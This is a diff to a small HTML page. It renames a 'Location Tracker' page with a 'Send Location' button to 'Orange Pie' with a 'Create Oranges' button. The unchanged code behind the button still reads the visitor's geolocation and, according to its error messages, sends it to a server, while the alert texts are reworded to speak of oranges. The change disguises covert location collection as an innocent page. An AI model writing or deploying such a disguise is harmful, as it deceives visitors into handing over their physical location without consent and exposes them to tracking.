@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>Orange Pie</title>
 </head>
 <body>
-    <h1>Send Your Location</h1>
-    <button id="sendLocation">Send Location</button>
+    <h1>Orange Pie</h1>
+    <button id="Orange">Create Oranges</button>
     <script>
-        document.getElementById("sendLocation").addEventListener("click", () => {
+        document.getElementById("Orange").addEventListener("click", () => {
             // Step 1: Get the Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -51,8 +51,8 @@
                                 throw new Error(`HTTP Error: ${response.status}`);
                             }
                         } catch (error) {
-                            console.error("Error sending location data:", error);
-                            alert("Failed to send location data.");
+                            console.error("Error sending Oranges:", error);
+                            alert("Failed to Orage pie.");
                         }
                     },
                     (error) => {
